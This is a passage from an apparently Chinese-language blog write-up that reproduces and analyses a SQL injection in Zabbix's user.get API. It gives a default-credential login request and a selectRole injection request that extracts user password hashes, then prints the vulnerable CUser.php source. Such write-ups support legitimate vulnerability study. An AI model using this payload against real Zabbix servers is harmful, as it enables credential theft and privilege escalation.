class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hostname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.182.1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/rUBD1LtuqGgMybQ.png" alt="img"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>Zabbix的addRelatedObjects函数中的CUser类中存在SQL注入，此函数由 CUser.get 函数调用，具有API访问权限的用户可利用造成越权访问高权限用户敏感信息以及执行恶意SQL语句等危害。</p><p>首先通过账号密码登录后台</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api_jsonrpc.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json-rpc</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>106</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user.login&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Admin&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;zabbix&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/RCBFnsmeO3qtau4.png" alt="img"></p><p>然后SQL注入获取敏感信息</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api_jsonrpc.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json-rpc</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>167</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;user.get&quot;</span>, <span class="string">&quot;params&quot;</span>: &#123;<span class="string">&quot;selectRole&quot;</span>: [<span class="string">&quot;roleid, u.passwd&quot;</span>, <span class="string">&quot;roleid&quot;</span>], <span class="string">&quot;userids&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;, <span class="string">&quot;auth&quot;</span>: <span class="string">&quot;2ae264ef7c19d2c2016a302c64e974c6&quot;</span>, <span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/w8234IGXQgxqLYS.png" alt="img"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>定位漏洞点<code>ui/include/classes/api/services/CUser.php#get</code>这个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$options</span> = []</span>) </span>&#123;</span><br><span class="line">  <span class="variable">$result</span> = [];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sqlParts</span> = [</span><br><span class="line">    <span class="string">&#x27;select&#x27;</span>=&gt; [<span class="string">&#x27;users&#x27;</span> =&gt; <span class="string">&#x27;u.userid&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>=&gt; [<span class="string">&#x27;users&#x27;</span> =&gt; <span class="string">&#x27;users u&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;where&#x27;</span>=&gt; [],</span><br><span class="line">    <span class="string">&#x27;order&#x27;</span>=&gt; [],</span><br><span class="line">    <span class="string">&#x27;limit&#x27;</span>=&gt; <span class="literal">null</span></span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$defOptions</span> = [</span><br><span class="line">    <span class="string">&#x27;usrgrpids&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;userids&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;mediaids&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;mediatypeids&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="comment">// filter</span></span><br><span class="line">    <span class="string">&#x27;filter&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;search&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;searchByAny&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;startSearch&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;excludeSearch&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;searchWildcardsEnabled&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="comment">// output</span></span><br><span class="line">    <span class="string">&#x27;output&#x27;</span>=&gt; API_OUTPUT_EXTEND,</span><br><span class="line">    <span class="string">&#x27;editable&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;selectUsrgrps&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;selectMedias&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;selectMediatypes&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;selectRole&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;getAccess&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;countOutput&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;preservekeys&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;sortfield&#x27;</span>=&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sortorder&#x27;</span>=&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;limit&#x27;</span>=&gt; <span class="literal">null</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$options</span> = <span class="title function_ invoke__">zbx_array_merge</span>(<span class="variable">$defOptions</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// permission check</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$userData</span>[<span class="string">&#x27;type&#x27;</span>] != USER_TYPE_SUPER_ADMIN) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$options</span>[<span class="string">&#x27;editable&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="string">&#x27;users_groups&#x27;</span>] = <span class="string">&#x27;users_groups ug&#x27;</span>;</span><br><span class="line">      <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][<span class="string">&#x27;uug&#x27;</span>] = <span class="string">&#x27;u.userid=ug.userid&#x27;</span>;</span><br><span class="line">      <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="string">&#x27;ug.usrgrpid IN (&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; SELECT uug.usrgrpid&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; FROM users_groups uug&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; WHERE uug.userid=&#x27;</span>.<span class="built_in">self</span>::<span class="variable">$userData</span>[<span class="string">&#x27;userid&#x27;</span>].</span><br><span class="line">      <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="string">&#x27;u.userid=&#x27;</span>.<span class="built_in">self</span>::<span class="variable">$userData</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// userids</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;userids&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">zbx_value2array</span>(<span class="variable">$options</span>[<span class="string">&#x27;userids&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;u.userid&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;userids&#x27;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// usrgrpids</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;usrgrpids&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">zbx_value2array</span>(<span class="variable">$options</span>[<span class="string">&#x27;usrgrpids&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="string">&#x27;users_groups&#x27;</span>] = <span class="string">&#x27;users_groups ug&#x27;</span>;</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;ug.usrgrpid&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;usrgrpids&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][<span class="string">&#x27;uug&#x27;</span>] = <span class="string">&#x27;u.userid=ug.userid&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mediaids</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;mediaids&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">zbx_value2array</span>(<span class="variable">$options</span>[<span class="string">&#x27;mediaids&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="string">&#x27;media&#x27;</span>] = <span class="string">&#x27;media m&#x27;</span>;</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;m.mediaid&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;mediaids&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][<span class="string">&#x27;mu&#x27;</span>] = <span class="string">&#x27;m.userid=u.userid&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mediatypeids</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;mediatypeids&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">zbx_value2array</span>(<span class="variable">$options</span>[<span class="string">&#x27;mediatypeids&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="string">&#x27;media&#x27;</span>] = <span class="string">&#x27;media m&#x27;</span>;</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;m.mediatypeid&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;mediatypeids&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][<span class="string">&#x27;mu&#x27;</span>] = <span class="string">&#x27;m.userid=u.userid&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// filter</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;autologout&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>]) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;autologout&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;autologout&#x27;</span>] = <span class="title function_ invoke__">getTimeUnitFilters</span>(<span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;autologout&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;refresh&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>]) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;refresh&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;refresh&#x27;</span>] = <span class="title function_ invoke__">getTimeUnitFilters</span>(<span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;refresh&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">      <span class="built_in">self</span>::<span class="title function_ invoke__">exception</span>(ZBX_API_ERROR_PARAMETERS, <span class="title function_ invoke__">_</span>(<span class="string">&#x27;It is not possible to filter by user password.&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dbFilter</span>(<span class="string">&#x27;users u&#x27;</span>, <span class="variable">$options</span>, <span class="variable">$sqlParts</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// search</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;search&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;search&#x27;</span>][<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">      <span class="built_in">self</span>::<span class="title function_ invoke__">exception</span>(ZBX_API_ERROR_PARAMETERS, <span class="title function_ invoke__">_</span>(<span class="string">&#x27;It is not possible to search by user password.&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">zbx_db_search</span>(<span class="string">&#x27;users u&#x27;</span>, <span class="variable">$options</span>, <span class="variable">$sqlParts</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// limit</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">zbx_ctype_digit</span>(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$userIds</span> = [];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sqlParts</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">applyQueryOutputOptions</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">tableName</span>(), <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">tableAlias</span>(), <span class="variable">$options</span>, <span class="variable">$sqlParts</span>);</span><br><span class="line">  <span class="variable">$sqlParts</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">applyQuerySortOptions</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">tableName</span>(), <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">tableAlias</span>(), <span class="variable">$options</span>, <span class="variable">$sqlParts</span>);</span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">DBselect</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">createSelectQueryFromParts</span>(<span class="variable">$sqlParts</span>), <span class="variable">$sqlParts</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="variable">$user</span> = <span class="title function_ invoke__">DBfetch</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$user</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;countOutput&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$result</span> = <span class="variable">$user</span>[<span class="string">&#x27;rowscount&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$userIds</span>[<span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"></span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;countOutput&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Adding objects</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;getAccess&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$userid</span> =&gt; <span class="variable">$user</span>) &#123;</span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$userid</span>] += [<span class="string">&#x27;gui_access&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;debug_mode&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;users_status&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$access</span> = <span class="title function_ invoke__">DBselect</span>(</span><br><span class="line">      <span class="string">&#x27;SELECT ug.userid,MAX(g.gui_access) AS gui_access,&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; MAX(g.debug_mode) AS debug_mode,MAX(g.users_status) AS users_status&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; FROM usrgrp g,users_groups ug&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; WHERE &#x27;</span>.<span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;ug.userid&#x27;</span>, <span class="variable">$userIds</span>).</span><br><span class="line">          <span class="string">&#x27; AND g.usrgrpid=ug.usrgrpid&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; GROUP BY ug.userid&#x27;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$userAccess</span> = <span class="title function_ invoke__">DBfetch</span>(<span class="variable">$access</span>)) &#123;</span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$userAccess</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="title function_ invoke__">zbx_array_merge</span>(<span class="variable">$result</span>[<span class="variable">$userAccess</span>[<span class="string">&#x27;userid&#x27;</span>]], <span class="variable">$userAccess</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addRelatedObjects</span>(<span class="variable">$options</span>, <span class="variable">$result</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// removing keys</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$options</span>[<span class="string">&#x27;preservekeys&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">zbx_cleanHashes</span>(<span class="variable">$result</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出这里在解析传入的参数。首先将传入的参数合并到参数模板中，然后根据合并后的参数调整SQL语句的<code>from</code>、<code>where</code>和<code>limit</code>等子句，然后查询用户表中所有字段</p><p><img src="https://s2.loli.net/2024/12/20/QhujTRSH6ldm4Vn.png" alt="img"></p><p><code>fetch</code>结果集后，<code>unset</code>了passwd这个敏感字段，所以预期这里的结果是获取不到passwd这个字段的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="variable">$user</span> = <span class="title function_ invoke__">DBfetch</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">  <span class="keyword">unset</span>(<span class="variable">$user</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;countOutput&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$user</span>[<span class="string">&#x27;rowscount&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$userIds</span>[<span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span>[<span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="variable">$user</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理完查询的结果集后，又向结果集中添加了一些对象，这里调用了<code>CUser#addRelatedObjects()</code>这个方法</p><p>Adds the related objects requested by “select*” options to the resulting object set.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span 